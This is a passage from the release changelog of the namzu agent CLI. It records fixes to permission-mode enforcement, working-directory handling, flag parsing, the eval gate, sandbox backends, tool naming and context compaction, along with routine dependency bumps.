  reading: a real pipe, an inherited-but-idle pipe and a test runner's stdin are
  indistinguishable to `fstat` on Windows — all three report neither FIFO nor
  file. So when the prompt came from an argument, the read waits up to 250ms for
  the first byte and then gives up; once a byte arrives it reads to end-of-input
  with no deadline, so a slow or large producer is never truncated. Without the
  bound, `namzu run "hello"` would hang forever in any context where stdin is open
  and silent, which is the ordinary state of a CI step. When there is no prompt
  argument the wait is unbounded, exactly as before — that path is a caller who
  has already said the prompt is coming.

- 663cde5: `run-stream` obeys the permission rules and mode it was given, instead of parsing them and running unrestricted

  `[permissions]` was compiled for `namzu run` and never for `namzu run-stream`, so
  a host UI ran with an empty rule list whatever the config said. `--permission-mode`
  had the same shape one level smaller: the shared parser accepted it, the command
  started, nothing failed, and the mode did nothing.

  Both are the defect the working-directory fix was about, in the change that was
  supposed to be about not making it again: **the run did not fail, it succeeded
  while quietly not doing what the operator said.** It is worse here, because the
  flag that silently does nothing is a SAFETY flag — someone reaches for `strict`
  precisely when they do not trust what the agent might do, and got an unrestricted
  run that looked like it had obeyed.

  `run-stream` now compiles the same table, resolves the same mode, and refuses a
  mode it does not recognise rather than proceeding. A rule that cannot be read is
  reported as an in-band error event, which is the only channel a host scanning
  stdout has.

- 5391d93: the agent works in the directory `--cwd` names, instead of searching this one and reporting nothing

  `--cwd` reached the session store and the skill search and stopped there. The
  run itself was started with the process's own directory, so:

  ```
  namzu run-stream --cwd /projects/foo "read notes.txt and edit it"
  ```

  made the model call `glob`, which answered

  ```
  No files found matching pattern "**/notes.txt" in /wherever/namzu/was/launched
  ```

  `notes.txt` exists. The agent looked somewhere else and reported the file
  missing, which is the worst available way to be wrong about a path — a user
  reads it as "that file is not there" rather than "I searched the wrong tree".
  Nothing was edited and the run still exited 0.

  The resolved directory is now what the whole session is built on: every
  filesystem tool, the sub-agent runtime, the task store and the memory store. It
  is threaded in as an argument (`createAgentSession(prefs, detected, { cwd })`)
  rather than read from `process.cwd()` at each of those four points, which is how
  the value went missing at exactly one of them.

  `--cwd` is also resolved to an absolute path and checked before the run starts.
  A path that is not there is refused instead of falling back to this directory —
  the silent fallback is what turned a typo into a run that searched somewhere
  else and found nothing.

  `namzu skills-json --cwd <path>` reads that directory's project skills too. It
  was the last command still ignoring the flag, so a host could be offered a skill
  for one checkout and then find that a turn in that same checkout could not load
  it.

  **Why no test caught it.** No test ran a file tool against a directory that was
  not the process's own, so the two were the same string in every assertion. The
  regression test executes the real `glob` builtin against a temporary directory
  and asserts it finds a file that exists nowhere else.

- Updated dependencies [062624c]
- Updated dependencies [bf0999d]
- Updated dependencies [bf0999d]
- Updated dependencies [cb772c7]
- Updated dependencies [062624c]
- Updated dependencies [bf0999d]
- Updated dependencies [69d609a]
  - @namzu/sdk@7.0.0
  - @namzu/anthropic@3.0.1
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.5.1

### Patch Changes

- Updated dependencies [f8355de]
- Updated dependencies [f8355de]
- Updated dependencies [f8355de]
  - @namzu/anthropic@3.0.0
  - @namzu/sdk@6.0.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.5.0

### Minor Changes

- 604a56a: completed is not succeeded — run_completed says why it stopped, and namzu run exits accordingly

  `run_failed` is emitted from exactly one place in the kernel: the throw path.
  Every other way a run can end badly arrives as `run_completed` — the token
  budget, the timeout, the iteration cap, a cancellation, a rejected plan, a
  refused structured output, and both guardrails.

  Measured: a `max_iterations` stop reports `status: 'completed'`, and the event
  carried nothing that distinguished it from an answered question.

  **SDK.** `run_completed` now carries `stopReason`. It is optional and additive,
  so nothing breaks; a consumer that wants to tell "answered" from "ran out of
  budget" no longer has to hold the `Run` alongside the event stream.

  **CLI — read this before upgrading if you script `namzu run`.** The command
  exited `0` for all of those. The sharp case is the output guardrail: an answer
  that was _refused_ exited `0` with empty text, so

  ```sh
  namzu run "write the release notes" > notes.md && publish notes.md
  ```

  published an empty file and reported success. `namzu run` now exits `1` when
  the run did not finish normally, and names the reason on stderr. The text still
  prints — partial output is real output, and a caller who piped it wants what
  there is — but `$?` can now say it is partial.

  If you have a script that depends on `namzu run` exiting 0 for a truncated run,
  it was depending on not being told. Check `$?` and read the stderr line.

  Also in the CLI, internally: the `done` agent event's `finishReason?: string`
  had no producer and no reader anywhere in the package, and the name belonged to
  a different concept — a "finish reason" here is `MessageStopReason`, reported
  per model message, not the run-level `StopReason` a caller asks about at the end
  of a turn. Replaced by `stopReason`. The type is not exported from the package
  entry, so this is internal.

- fdbbfb2: run-stream honours --cwd, and stops reading unknown flags aloud to the model

  `run-stream` and `history` both advertise `--cwd <path>` in their own help
  text. Neither ever parsed it. Worse than ignored: the parser folded every
  argument it did not recognise into `rest`, and `rest.join(' ')` is the
  **prompt** — so the invocation our help teaches,

  ```
  namzu run-stream --cwd /projects/foo "summarise this"
  ```

  sent the model a prompt reading `--cwd /projects/foo summarise this` while
  silently using the process's own directory. For `history` the same omission
  meant a host asking about a session in another checkout was told `[]`, which
  is indistinguishable from a session that exists and has no messages.

  `--cwd` is now parsed and actually used — it selects the `.namzu` store the
  session is read from and the directory skills are discovered in.

  **Behaviour change worth reading before you upgrade.** An unrecognised
  `--flag` is now refused with an error event instead of becoming prompt text.
  This is what makes a typo — `--modell gpt-4o` — a message rather than
  something the model is asked to interpret. If you deliberately send a prompt
  that begins with a dash, put `--` in front of it:

  ```
  namzu run-stream -- --force should be added to the docs
  ```

  Everything after `--` is prompt, verbatim. A single leading `-` was never
  treated as an option and still is not.

  Classified `minor` rather than `major` because this package is `0.x`, where
  [SemVer §4](https://semver.org/#spec-item-4) states the public API should not
  be considered stable and anything may change. On a `1.x` package the refusal
  would owe a major.

### Patch Changes

- Updated dependencies [604a56a]
- Updated dependencies [f25ebce]
- Updated dependencies [5496fb2]
- Updated dependencies [f25ebce]
- Updated dependencies [f25ebce]
- Updated dependencies [ca64062]
- Updated dependencies [61ca851]
- Updated dependencies [c8672ed]
- Updated dependencies [f25ebce]
- Updated dependencies [f25ebce]
- Updated dependencies [c6b8aa8]
  - @namzu/sdk@5.2.0
  - @namzu/anthropic@2.0.1

## 0.4.2

### Patch Changes

- a2cedfd: `namzu eval` now defaults `--dir` to `packages/evals`.

  The eval package moved there from the repository root. It is `@namzu/evals`, a
  private workspace member like every other package, and it was the only one
  living outside `packages/` — so `packages/*` in the workspace file now covers
  it and the explicit entry is gone.

  Pass `--dir` if your suites live elsewhere; the flag is unchanged.

- Updated dependencies [1cd1094]
- Updated dependencies [19d6a0f]
- Updated dependencies [1500973]
- Updated dependencies [a2cedfd]
  - @namzu/sdk@5.0.0
  - @namzu/anthropic@2.0.0
  - @namzu/openrouter@2.0.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0

## 0.4.1

### Patch Changes

- Updated dependencies [c3cb587]
- Updated dependencies [2b9d90e]
- Updated dependencies [4be54ca]
- Updated dependencies [a1f67f3]
- Updated dependencies [df07db8]
- Updated dependencies [19f390a]
  - @namzu/sdk@4.0.0
  - @namzu/anthropic@1.3.0
  - @namzu/ollama@1.2.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@1.1.0

## 0.4.0

### Minor Changes

- a1bf8ec: The behaviour gate can go red.

  Three things stood between `namzu eval` and being a gate, and each one made it report success.

  **It exited 0 when a suite never settled.** The promise stayed pending, node's event loop drained, `process.exit` was never reached, and the process ended on its default code. A gate that reports success by hanging is worse than no gate, because the green tick is what stops anyone from looking. Each suite now runs against a deadline (`--timeout-ms`, default five minutes) and a suite that overruns is **inconclusive** — exit 2 — with a message naming it. Inconclusive rather than failed, matching the rule the exit codes already state: nothing was judged, so there is no regression to chase, there is a harness to fix.

  **CI invoked the wrong file.** The step ran `packages/cli/dist/index.js`, which is the package barrel and not the CLI, so it executed nothing and passed on every push since it was added.

  **There were no suites.** `evals/` is now a private workspace member with a first suite, and `continue-on-error` is gone from the CI step — its own comment said to drop it the moment a suite existed, or the gate is decoration.

  The first suite pins loop behaviour against a scripted provider: a turn with no tool calls settles on its text, every call in one turn runs in the order it was issued, a failing tool goes back to the model instead of killing the run, and a forced tool choice applies to the step that asked and no further. Nothing there measures a model — the turns are fixed, so a score that moves means the kernel changed. A suite that calls a real provider measures two things at once and cannot say which one moved; those belong behind a tag.

### Patch Changes

- Updated dependencies [480892a]
- Updated dependencies [05b4103]
- Updated dependencies [480892a]
- Updated dependencies [beacf2d]
- Updated dependencies [e1a5e2d]
- Updated dependencies [b807b0d]
- Updated dependencies [9d2b927]
- Updated dependencies [7370f6d]
- Updated dependencies [ea2148c]
- Updated dependencies [480892a]
- Updated dependencies [9bbb8be]
- Updated dependencies [480892a]
- Updated dependencies [8518b40]
- Updated dependencies [480892a]
- Updated dependencies [e1a5e2d]
  - @namzu/sdk@3.2.0
  - @namzu/ollama@1.2.0

## 0.3.0

### Minor Changes

- 935b8f3: A bad flag is a usage error, not a broken CLI

  `namzu doctor` answered 70 — sysexits `EX_SOFTWARE`, "the program itself failed" — when the caller mistyped a flag. That tells an operator to file a bug for their own typo, and it disagreed with every sibling command. It now answers 64, `EX_USAGE`, and the code is part of the documented contract.

  Six published pages were also corrected against the source rather than reworded: `provider.chat()` was removed from the provider interface and is now shown as the streaming call aggregated; the built-in tool names are documented as registered (lowercase) rather than as an older capitalization that made the copy-pasteable `activate` example throw; the tool count matches what `getBuiltinTools()` returns, including the one tool no page had ever mentioned; a deleted store symbol is replaced by the one that exists; a retrieval field is named as it is declared; and two config fields documented as unavailable on the reactive agent are shown as what they are — present and forwarded.

- 935b8f3: `namzu eval` — the harness's signal can finally reach CI.

  The eval surface was a library function and a string formatter: no command,
  no CI step, and `formatReport` ending at `lines.join('\n')` with no file
  write and no exit code. Its stated purpose is to give a behaviour change a
  regression signal, and that signal could not reach a build without every
  consumer hand-writing the runner and the report-to-exit-code mapping.

  ```bash
  namzu eval --dir evals --out eval-report.json
  namzu eval --tag fast
  ```

  A suite is a `*.eval.js` file that default-exports a function returning an
  `ExperimentReport` and may export a `tags` array. The `run` callback stays
  caller-owned, so a suite owns everything about how its runs are
  constructed.

  | Exit | Meaning                                                        |
  | ---- | -------------------------------------------------------------- |
  | `0`  | Every case passed                                              |
  | `1`  | At least one case failed — a regression to chase               |
  | `2`  | At least one case was inconclusive — a broken harness to fix   |
  | `3`  | No suite found, one could not load, or `--tag` matched nothing |

  `2` is separate from `1` for the same reason `unavailable` is not zero: a
  suite that could not judge tells you nothing about the cases it did judge,
  and collapsing the two sends somebody hunting a behaviour change that never
  happened. It is checked first. `3` rather than `0` for an empty discovery,
  because a gate that finds nothing to run must not report green — and the
  tag filter reports how many suites it skipped, since a filter that quietly
  matched nothing looks exactly like a passing run.

  Suite ids are path-derived and posix-separated so two commits' artifacts
  describe the same suites and can be diffed; two files resolving to one id
  is refused rather than resolved. The artifact is the whole report, because
  a summary cannot say which scorer moved.

  The CI workflow runs it with `continue-on-error` until the repo ships its
  first suite — noted in the workflow so the flag is removed rather than
  forgotten.

### Patch Changes

- 935b8f3: Four places where namzu knew something and told no one.

  **A backoff is now visible.** `withProviderRetry` logged and slept. There
  was no run event, no wire event, and — worse than that — the sole
  production call site never passed a logger, and every warn in the decorator
  is guarded behind it, so the log lines were dead code too. A run could sit
  silent for the better part of a minute between `iteration_started` and the
  next event, or up to the 60s server-directed cap, with no signal and no
  keepalive: a backoff was indistinguishable from a hang, and a host's
  watchdog would cancel a run that was about to succeed.

  A `provider_retry` run event now carries the attempt, the ceiling, the
  delay, the classified code and whether the server asked for it, mapped to
  `provider.retry` on the SSE wire and to a `running` status update over A2A.
  It is emitted **before** the sleep, so the delay it names is still ahead —
  which is also why it rides the stream as a delta-less chunk rather than an
  out-of-band callback: the consumer is blocked inside the provider's
  iterator, so a callback could not reach it until the wait was already over.
  The omission was never principled; `tool_progress` exists to answer "is it
  still working?" and the wire contract justifies the reasoning events on
  exactly the same grounds.

  **Two latency measurements that could not be recovered from the data.**
  `gen_ai.client.time_to_first_token` is recorded at the first delta of any
  kind. namzu streams, so perceived latency is dominated by that number, and
  the one existing latency histogram measures the whole request — it cannot
  tell a fast-first-token long generation from a stalled one, and no host
  could reconstruct the difference in any form.
  `gen_ai.tool.call.duration` records what the executor has measured since
  its first version: the value was already in scope one frame above the call
  site, emitted per call on `tool_completed`, and had no instrument. It
  carries the same attributes as the tool-call counter, so "which tool is
  slow" and "which tool fails" are one query rather than two that cannot be
  joined.

  **`run_failed` carries the classification it always had.** The event was a
  bare string, and the run boundary flattened the throwable into it,
  discarding `code`, `status`, `retryAfterMs`, `retryable`, `details` and the
  cause chain. This was never a missing taxonomy: the provider-boundary
  classifier already walks all of that, so a fully-populated error arrived at
  the boundary and was thrown away one line later — and `toPlatformError`,
  the projection written for exactly this, had no callers outside its own
  test. `run_failed` now carries `failure` alongside `error`; the A2A bridge
  sends it as event metadata (a peer deciding whether to retry needs the
  flag, not prose to pattern-match) and the CLI prefixes the code. Nothing
  had to change at the hundreds of `throw` sites.

  Not fixed, and worth naming: the advisory `on_error` trigger still
  substring-matches. Its input is tool output from the message history, which
  has no structured code to preserve — that needs a tool-side error catalog,
  not this change.

  **The published attribute constants can no longer drift.**
  `@namzu/telemetry/attributes` restated the attribute bags by hand and had
  already lost `GENAI.TOKEN_TYPE`, the dimension that splits the token
  counter by kind. The consequence was narrow — namzu emits through the
  canonical module, so the dimension is on the data regardless — but this is
  the entry point the observability docs steer consumers to, the package had
  no tests at all, and the public-surface verifier only loads the SDK bundle.
  It is now a re-export, with a parity test so a future hand-copy fails
  immediately.

- 935b8f3: namzu takes its naming from nobody, and now there is a gate that proves it.

  `scripts/audit-external-names.mjs` refuses a third-party product name in a
  comment or an identifier, and runs in CI. It found 31 real ones — most of
  them in the TUI, where the design was being explained as "modelled on how X
  presents text", "X-style grouping", "like X / Y".

  That is the failure the rule exists for. A design explained by reference to
  somebody else's product has handed over its rationale: the next reader
  reaches for that product's model instead of asking what namzu is trying to
  achieve, and when the reference changes the comment becomes a claim nobody
  can check. Each one now states the same decision on its own terms — what it
  accomplishes, and what breaks without it.

  The kernel had eleven, all in prose explaining a wire behaviour by naming
  the vendor whose endpoint exhibits it. A 400 for an unanswered `tool_use`
  is a property of the protocol, not of a company; several function-calling
  endpoints report `stop` alongside populated tool calls, and which ones is
  not the point.

  The identity prompt named the products it told the model not to be. It now
  says the stronger thing without them: the underlying model is an
  implementation detail of how namzu runs, not who it is.

  What the audit deliberately does NOT flag, because a rule that cries wolf
  gets switched off: wire values and the files that carry them. A
  context-window table keyed by model id must contain real model ids or it
  resolves nothing; a driver package is named after the service it drives.
  The exemption is per path and narrow, and the script says where the line
  falls. Scanning string literals was tried and rejected in the same spirit —
  it flagged driver ids in switch statements and model ids in test fixtures
  everywhere, which would have meant exempting half the tree.

  Two matcher details worth keeping: the camelCase check is case-SENSITIVE,
  because an `i` flag turns `[A-Z]` into `[A-Za-z]` and the rule starts
  rejecting `coherent` for `cohere` and `strands` for the English verb. And
  `cursor` is absent from the list entirely — it collides with the pagination
  cursor this codebase threads through every list call.

- 935b8f3: Three public identifiers named a vendor where the code was generic. Renamed,
  and in two cases the naming was hiding a design problem worth fixing.

  **`OpenRouterEmbeddingProvider` → `HttpEmbeddingProvider`** (config type
  likewise). Nothing about the class was vendor-specific: it POSTs to
  `{baseUrl}/embeddings` with a bearer key and reads back
  `{ data: [{ index, embedding }] }` — the shape every hosted embeddings
  service speaks. Only the name and a default host said otherwise.

  `baseUrl` is now **required**. It defaulted to one vendor's host, which
  meant a caller who never named an endpoint still shipped its text to one. A
  default network destination is a decision the caller has to make out loud.
  A trailing slash is now tolerated rather than producing a doubled path.

  **`AgentFactoryOptions.provider`** was `'openrouter' | 'bedrock'` — a closed
  two-member union in a generic factory, naming two specific services that the
  provider registry has never been limited to and that no caller could extend.
  It is now `string`: any registered provider type.

  **`AgentFactoryOptions.bedrockConfig`** is replaced by
  `providerConfig?: Record<string, unknown>`, passed through untouched. The
  old field existed for exactly one service and had no construction site
  anywhere in the workspace.

  **`StorageProviderId`**: the `'anthropic-files'` member is now
  `'provider-files'`.

- 935b8f3: Reclaim context by clearing stale tool output, before summarizing
  destructively.

  Compaction was all-or-nothing: once the threshold hit, every older message
  became a summary and the agent's own reasoning — the decisions, the false
  starts it learned from, the exact wording of a plan — was paraphrased away
  with it. That is a heavy price for a context problem usually caused by
  something much dumber: a handful of enormous tool outputs the agent already
  read, took what it needed from, and moved past.

  `clearStaleToolResults` replaces the OUTPUT of old, large tool results with
  a short placeholder that names the tool and its original size, so a result
  that turns out to still be needed is one tool call away rather than lost.
  It is safe where trimming is not, because nothing moves — the `tool` message
  keeps its position and its `toolCallId`, so `tool_use` ↔ `tool_result`
  pairing is intact by construction.

  It runs first in `runCompactionCheck`; if it gets the context back under
  `triggerThreshold`, summarization is skipped entirely and the history stays
  verbatim. New `CompactionConfig` fields: `clearToolResults` (default
  `true`), `keepRecentToolResults` (3), `minToolResultCharsToClear` (1000),
  `preserveToolResultsFrom`.

  Never clears an error result (the error is what steers the next turn), the
  most recent N results (still in use), or anything below the size floor
  (the placeholder would cost as much). Image payloads are measured by their
  base64 size — a screenshot is the largest thing a tool result can carry and
  exactly the kind of output an agent reads once.

- 935b8f3: `--help` on `run`, `run-stream` and `history` now answers instead of
  running.

  `passThrough` turns commander's `--help` off so a command can parse it
  itself — right for the commands that render their own. The three that do
  not were receiving `--help` as **input**: for `run` it became the prompt to
  send to a model, so a user asking how to use it got "no LLM provider
  available"; for `history` it became the session to look up, so they got
  `[]`.

  `CommandDef.help` fills that in, and the registry answers before the
  handler runs. Handling it there rather than in each command is what stops
  the fourth one from doing the same thing. A command that renders its own
  help sets nothing and is untouched.

  Found by running the built binary. Every one of these commands had passing
  tests — none of them invoked `--help`, because the suite tested what the
  commands do and not what a person types first.

- 935b8f3: **Breaking:** `@namzu/sandbox` declares only the backends it has.

  Four of the shapes this package offered could type-check and then throw: a `process` tier, a `passthrough` tier, and two adapters to third-party managed schedulers, none of which was ever written. Each demanded required configuration for a call that was never made — the `self-hosted` microvm arm went further and required three fields belonging to a local-daemon path that does not exist, while the two fields the working path needs were optional. So the only configuration that ran had to supply three values nothing reads, and omitting the two that matter compiled its way to a runtime throw.

  `SandboxTier` is now `container | microvm`. `MicroVMBackendConfig` is one shape whose `orchestratorEndpoint` and `getToken` are required. `SandboxBackendNotImplementedError` stays exported and thrown: a JS host that invents a tier gets a named refusal rather than a provider that confines nothing.

  The `sandbox.platform` health check now asks the provider what this host enforces instead of answering from a table keyed on the OS name. That table had drifted both ways — it called the Linux probe unimplemented long after the provider began probing real flags, and it told a Windows operator that sandboxing is "not supported", which is true of the in-process tier and silent about the container tier that runs there. Every non-passing result now names the missing controls and what to do about them.

  `SANDBOX_ISOLATION_CONTROLS` is exported as a value from `@namzu/sdk`. It was reachable only through `export type *`, so importing it type-checked and then failed on the first line of a built binary.

- 935b8f3: namzu's own vocabulary, everywhere.

  Comments across the kernel explained namzu's design by naming another
  product: "mirrors X's container architecture", "reference: X's
  `normalizePathForSandbox()`", "which is what Y and Z both do", "Claude Code
  uses 2000 for the same reason". Behaviour was correct throughout — this is
  about what the code says it is. A kernel that explains itself by citation
  reads as a reimplementation of something else, and namzu is not one.

  Every such comment now states the reason directly. Where a rule exists
  because a provider requires it, the comment says what the requirement is
  rather than whose it is — which is also more useful, since the same
  requirement usually holds for more than one provider, and a reader who has
  never used the named one can still follow it.

  **Breaking (types only, no runtime behaviour):**

  - `ToolCatalogSurface`: the `'cowork'` member is now `'supervised'`.
  - `ToolSource.skill.type`: `'anthropic' | 'custom'` is now
    `'published' | 'custom'`.

  Both are descriptive metadata with no construction site anywhere in the
  workspace, so nothing internal moved. An external consumer that names
  either value gets a compile error pointing at the line.

  **Deliberately unchanged**, because these are addresses rather than
  borrowed naming: model-id prefixes in the context-window table (data the
  runtime matches against), API-key detection patterns in the guardrail
  presets (a pattern is worthless if you cannot tell what it detects),
  namzu's own provider package names, and the credential-store integration in
  the CLI, whose service name and file path are literally the other tool's.

- 935b8f3: A payload that brought its own rendering now uses it in text format.

  A command that wants both a structured payload — what `json` and `yaml`
  emit, and what a CI job parses — and a human string had to choose one.
  Passing the object meant the text format dumped a nested object graph where
  a report was meant to be, with the readable version sitting unused in a
  `text` field one level down. `namzu eval` did exactly that in its default
  format.

  Found by running the built binary, not by a test. The command's own tests
  asserted on the payload, which was correct, and never on what a person
  sees — so the failure lived in the one place the suite was not looking.
  There is now a test for it, and `json` still emits the whole payload:
  collapsing that to the string would trade one broken format for another.

- 935b8f3: Tool names are validated, and a paged remote catalogue is read to the end.

  **Every plugin-contributed tool name was illegal.** A tool name reaches the
  provider verbatim and the major message APIs accept `[a-zA-Z0-9_-]` up to 64
  characters — but the plugin namespace separator was `:`, so every tool a
  plugin contributed carried a name the wire rejects. Nothing checked: names
  are derived by concatenation at three separate construction sites and none
  validated the result.

  The rejection is a 400 on the **whole request**, not on that tool. Those
  tools are registered deferred, so it fired the moment something activated
  one, with nothing naming the culprit.

  - `assertToolName` runs at registration, where a bad name can still be
    attributed and costs the run nothing.
  - **Breaking:** `PLUGIN_NAMESPACE_SEPARATOR` is now `__`, which renames every
    plugin-contributed tool id — `fs-plugin:mcp__fs__read_file` becomes
    `fs-plugin__mcp__fs__read_file`. A host that names one of these in an
    allowlist, a permission rule or a preserve-list must update it. The two
    changes have to land together: adding the check without the rename would
    refuse every plugin tool.

  One driver had already ratified passing names through untouched, on the
  grounds that a confusing name is "a naming problem to fix in the registry,
  not something to paper over" — which is precisely why the registry has to be
  the one that checks.

  **A paged remote catalogue is now read to the end.** `tools/list`,
  `resources/list` and `resources/templates/list` each sent an empty params
  object and returned the first page — never sending a cursor, never reading
  the one that came back. A server that pages its catalogue contributed only
  its first page: the rest were never registered, never namespaced, never
  advertised, with no error and no warning. Drift detection did not help
  either, since it compared page one against page one.

  The symptom is a model that never uses a tool it was told about, which reads
  as model incompetence rather than a client bug. Both clients — the SDK's and
  the CLI's — now thread the cursor. A server whose cursor never ends is
  refused after 100 pages rather than looping forever or stopping silently,
  since stopping silently is the failure being fixed.

- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [29f35c8]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
- Updated dependencies [935b8f3]
  - @namzu/sdk@3.0.0
  - @namzu/anthropic@1.3.0
  - @namzu/openai@1.1.0
  - @namzu/ollama@1.1.0
  - @namzu/openrouter@1.1.0

## 0.2.3

### Patch Changes

- 6b0fbfd: Replace the built-in filesystem mutation contracts with one strict canonical
  shape per tool: `edit` accepts `path`, `old_string`, `new_string`, and optional
  `replace_all`; `write` accepts `path` and `content`. Remove line insertion and
  legacy aliases, serialize same-process mutations by resolved path, and document
  replay-safe marker advancement for bounded long-document writes. Local writes
  commit through same-directory temp files and atomic rename; sandbox
  implementations are required to provide the same atomic replacement contract.
- Updated dependencies [11167dd]
- Updated dependencies [6b0fbfd]
  - @namzu/sdk@2.0.0
  - @namzu/anthropic@1.2.0
  - @namzu/ollama@1.0.3
  - @namzu/openai@1.0.3
  - @namzu/openrouter@1.0.3

## 0.2.2

### Patch Changes

- Updated dependencies [c7cf4c7]
- Updated dependencies [f002c44]
- Updated dependencies [3fd2524]
- Updated dependencies [e9c974c]
  - @namzu/sdk@1.4.0
  - @namzu/anthropic@1.1.2
  - @namzu/ollama@1.0.3
  - @namzu/openai@1.0.3
  - @namzu/openrouter@1.0.3

## 0.2.1

### Patch Changes

- Updated dependencies [cc6b5f3]
- Updated dependencies [f1f000c]
- Updated dependencies [30c755d]
- Updated dependencies [f1f000c]
- Updated dependencies [f1f000c]
  - @namzu/sdk@1.2.0
  - @namzu/openai@1.0.2
  - @namzu/ollama@1.0.2
  - @namzu/anthropic@1.1.1
  - @namzu/openrouter@1.0.2

## 0.2.0

### Minor Changes

- 11e1a70: run-stream gains `--session <key>` and a new `history --session <key>` command:
  bind a headless turn to a persisted conversation in the cwd's `.namzu` store
  (keyed by an embedder's own session id), so prior turns load as context and
  the turn is appended. `history` prints that conversation's `{role,content}[]`
  as JSON. This lets a host UI (the clawtool desktop) resume a session's
  transcript and keep multi-turn context across separate one-shot invocations.
- 022b082: run-stream gains a `--provider` flag (override the persona's configured provider
  for the turn, alongside --model). New `providers-json` command prints every
  registry provider with its detection state, default model, and a best-effort
  live model list (`{provider,label,detected,default,models[]}[]`) so a host UI can
  build a dynamic provider/model picker instead of a hardcoded list. listModels is
  probed per detected provider with a 3s race + free-text fallback. The listing
  path registers the vendor package (ensureRegistered) before constructing the
  provider, so a detected provider returns its real model catalog instead of an
  empty list — without it ProviderRegistry.create throws "Unsupported provider
  type" and the picker silently degrades to free-text for every provider.
- 02f37e1: run-stream gains `--model`, `--instance`, and `--skills <a,b,c>` flags so a host
  UI can drive which model answers, attribute the run to a named instance, and
  load specific skills' bodies into the turn (via the same extra-system channel
  the TUI's `/skill` uses). Adds a `skills-json` command that prints discovered
  skills as `{name, description, source}[]` for a host's skill picker.
- 1032736: Add `namzu run-stream` — a headless streaming one-shot that runs the same
  agent as the TUI but emits one compact NDJSON line per `AgentEvent`
  (delta / tool-start / tool-end / error / done) to stdout, instead of
  buffering the final text like `run`. Prior conversation history is read
  from stdin as a JSON `Message[]`. This lets a host process (e.g. a desktop
  UI) line-scan stdout and render a turn live, with the host owning
  persistence — the equivalent of the TUI driven from another runtime.

### Patch Changes

- Updated dependencies [ac85934]
- Updated dependencies [999e4be]
- Updated dependencies [9df35d1]
- Updated dependencies [42f577e]
- Updated dependencies [6c09394]
- Updated dependencies [9a0c5ee]
- Updated dependencies [0d1fb7b]
- Updated dependencies [2c5dd7a]
- Updated dependencies [271e6cf]
- Updated dependencies [8c07556]
- Updated dependencies [b776acf]
  - @namzu/sdk@1.1.0
  - @namzu/anthropic@1.1.0
  - @namzu/openai@1.0.1
  - @namzu/openrouter@1.0.1
  - @namzu/ollama@1.0.1

## 0.1.0

### Minor Changes

- bf9fce7: **The agent can curate its own memory, and the status bar shows token/cost.**

  namzu now exposes a `remember` tool to the model: when it learns a durable fact (a stable preference, a project fact, a decision) it can save it to `~/.namzu/MEMORY.md` itself — which is injected into every future session. Just tell namzu "remember that I deploy on Fridays" and it persists it with no prompt (it's a safe self-write to your own memory file, exempt from the permission prompt).

  The status bar now reports the current turn's token usage (and cost when the model is priced), e.g. `74.1k tok · $0.05`, so you can see what the agent — especially during long autonomous runs — is consuming.

- cf88473: **Cross-terminal agent awareness via clawtool's peer registry (no separate daemon).**

  namzu now registers itself as a peer in clawtool's BIAM registry on launch (clawtool is the coordination daemon namzu already discovers — there's no separate `namzu serve`). `/agents` lists every agent peer clawtool knows about across your terminals and LAN — namzu, claude-code, codex, gemini — and `/msg <peer> <text>` sends a message to another peer's inbox. Presence is best-effort: with no clawtool running, namzu behaves exactly as before.

- 63e849b: **M1 — Clawtool default plugin** (`ses_002-clawtool-bridge`)

